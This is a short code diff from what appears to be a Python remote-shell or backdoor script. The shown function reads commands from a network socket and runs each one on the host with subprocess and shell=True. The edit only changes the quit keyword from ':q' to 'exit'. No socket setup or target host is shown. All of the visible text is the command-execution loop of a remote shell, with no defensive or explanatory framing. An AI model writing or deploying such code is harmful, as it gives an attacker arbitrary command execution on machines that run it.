@@ -8,7 +8,7 @@ import subprocess
 def shell():
     while True:
         command = sock.recv(1024)
-        if command.decode() == ':q':
+        if command.decode() == 'exit':
             break
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
